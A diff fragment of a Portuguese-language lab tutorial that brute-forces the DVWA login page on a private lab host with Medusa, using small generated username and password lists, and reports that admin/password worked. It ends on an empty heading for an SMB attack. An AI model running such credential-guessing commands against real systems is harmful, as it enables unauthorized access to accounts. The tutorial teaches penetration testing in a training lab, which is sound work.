@@ -35,3 +35,19 @@ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 
 Após gerar os arquivos, iremos ao ataque de fato.
+
+Iremos usar o coamnado abaixo para ralizar as tentativas de acesso ao site em questão, ilustrado na figura7.
+
+medusa -h 192.168.222.3 -U users.txt -P pass.txt -M http \
+-m PAGE:'dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^$Login=login' \
+-m 'FAIL=Login failed' -t 6
+
+Após a execução do comando, pudemos ver entre as senhas testadas que o usuário admin e a senha password foi válida para acesso ao site, conforme imagem8.
+Na imagem9 podemos ver o site aberto e com o acesso feito com o usuário e senha em questão.
+
+% ATAQUE SERVIÇO SMB
+
+
+
+
